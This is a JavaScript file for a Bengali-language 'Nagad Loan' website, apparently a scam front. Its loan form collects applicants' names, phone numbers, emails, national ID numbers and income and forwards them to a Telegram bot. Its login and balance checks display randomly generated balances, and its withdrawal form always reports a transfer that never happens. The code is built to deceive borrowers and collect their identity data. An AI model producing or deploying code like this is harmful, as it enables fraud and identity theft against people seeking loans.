// ======================================
// নগদ লোন - মেইন স্ক্রিপ্ট
// ======================================

console.log('%c✓ নগদ লোন প্ল্যাটফর্ম লোড হয়েছে', 'color: #ffc107; font-size: 16px; font-weight: bold;');

// ======================================
// নম্বর ফর্ম্যাটিং
// ======================================

function formatBanglaNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// ======================================
// সাফল্য/ত্রুটি সতর্কতা 
// ======================================

function showSuccessAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-success alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

function showErrorAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-danger alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

function showWarningAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-warning alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

// ======================================
// লোন আবেদন - টেলিগ্রাম ইন্টিগ্রেশন
// ======================================

function submitLoanApplication() {
    const form = document.getElementById('loanForm');
    
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }

    // ফর্ম ডেটা সংগ্রহ
    const fullNameInput = form.querySelector('input[placeholder="আপনার নাম"]');
    const mobileInput = form.querySelector('input[placeholder="01345345678"]');
    const emailInput = form.querySelector('input[placeholder="আপনো ইমেইল"]');
    const nidInput = form.querySelector('input[placeholder="এনআইডি"]');
    const loanAmountInput = form.querySelector('input[placeholder="120000"]');
    const loanTermSelect = form.querySelector('select');
    const annualIncomeInput = form.querySelector('input[placeholder="আপনার বার্ষিক আয়"]');

    const formData = {
        fullName: fullNameInput ? fullNameInput.value : '',
        mobileNumber: mobileInput ? mobileInput.value : '',
        email: emailInput ? emailInput.value : '',
        nid: nidInput ? nidInput.value : '',
        loanAmount: loanAmountInput ? parseInt(loanAmountInput.value) : 0,
        loanTerm: loanTermSelect ? parseInt(loanTermSelect.value) : 0,
        annualIncome: annualIncomeInput ? parseInt(annualIncomeInput.value) : 0,
        submittedAt: new Date().toLocaleString('bn-BD')
    };

    // আবেদন ID তৈরি
    const applicationId = generateLoanId();
    formData.applicationId = applicationId;

    // টেলিগ্রাম সেটিংস চেক
    const telegramSettings = getTelegramSettings();
    if (!telegramSettings.botToken || !telegramSettings.chatId) {
        showErrorAlert('সেটিংস প্রয়োজন', 'সেটিংসে টেলিগ্রাম বট টোকেন ও চ্যাট আইডি যোগ করুন।');
        return;
    }

    // লোডিং দেখান
    showLoadingDisplay('প্রক্রিয়াধীন', 'আপনার আবেদন টেলিগ্রামে পাঠানো হচ্ছে...');

    // আবেদন সংরক্ষণ
    storePendingApplication(applicationId, formData);

    // টেলিগ্রামে পাঠান
    sendLoanApplicationToTelegram(applicationId, formData, telegramSettings).then(sent => {
        if (sent) console.log('✓ টেলিগ্রামে পাঠানো সফল');

        // মডাল বন্ধ
        setTimeout(() => {
            const modal = bootstrap.Modal.getInstance(document.getElementById('loanModal'));
            if (modal) modal.hide();
            form.reset();
            form.classList.remove('was-validated');
        }, 1000);

        // পোলিং শুরু
        setTimeout(() => {
            showLoadingDisplay('অপেক্ষমাণ', '⏳ টেলিগ্রামে Accept/Reject এর জন্য অপেক্ষা করছি...');
            pollForApproval(applicationId, formData.loanAmount);
        }, 1500);
    });
}

// ======================================
// উইথড্র ফাংশন
// ======================================

function submitWithdrawal() {
    const form = document.getElementById('withdrawForm');
    
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }

    showSuccessAlert(
        'উইথড্র সফল!',
        'আপনার টাকা ২৪ ঘন্টার মধ্যে অ্যাকাউন্টে জমা হবে।'
    );

    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawModal'));
        if (modal) modal.hide();
        form.reset();
        form.classList.remove('was-validated');
    }, 2000);
}

// ======================================
// লোগইন ফাংশন
// ======================================

function submitLogin() {
    const form = document.getElementById('loginForm');
    
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }

    const randomBalance = Math.floor(Math.random() * 500000) + 10000;
    document.getElementById('currentBalance').textContent = formatBanglaNumber(randomBalance) + ' Taka';
    
    showSuccessAlert('লগইন সফল!', 'আপনি সফলভাবে লগইন করেছেন।');

    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
        if (modal) modal.hide();
        form.reset();
        form.classList.remove('was-validated');
    }, 2000);
}

// ======================================
// ব্যালেন্স চেক
// ======================================

function checkBalance() {
    const form = document.getElementById('balanceCheckForm');
    
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }

    const randomBalance = Math.floor(Math.random() * 1000000) + 50000;
    document.getElementById('balanceResultAmount').textContent = formatBanglaNumber(randomBalance) + ' টাকা';
    document.getElementById('balanceResult').style.display = 'block';
    
    showSuccessAlert('ব্যালেন্স পাওয়া গেছে!', 'আপনার ব্যালেন্স উপরে দেখানো হয়েছে।');
}

// ======================================
// লোন আইডি তৈরি
// ======================================

function generateLoanId() {
    const prefix = 'NGD';
    const timestamp = Date.now().toString().slice(-6);
    const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
    return `${prefix}-${timestamp}-${random}`;
}

// ======================================
// মসৃণ স্ক্রোলিং
// ======================================

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    });
});

// ======================================
// নেভিগেশন ইফেক্ট
// ======================================

window.addEventListener('scroll', function() {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 50) {
        navbar.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.2)';
    } else {
        navbar.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
    }
});

// ======================================
// মোবাইল মেনু বন্ধ করা
// ======================================

const navbarCollapse = document.querySelector('.navbar-collapse');
if (navbarCollapse) {
    const navLinks = navbarCollapse.querySelectorAll('a.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            const bsCollapse = new bootstrap.Collapse(navbarCollapse, { toggle: false });
            bsCollapse.hide();
        });
    });
}

// ======================================
// ডকুমেন্ট লোড ইভেন্ট
// ======================================

document.addEventListener('DOMContentLoaded', function() {
    console.log('✓ ডকুমেন্ট লোড হয়েছে');
});

console.log('%c✓ সমস্ত স্ক্রিপ্ট লোড সম্পূর্ণ', 'color: #28a745; font-size: 12px;');
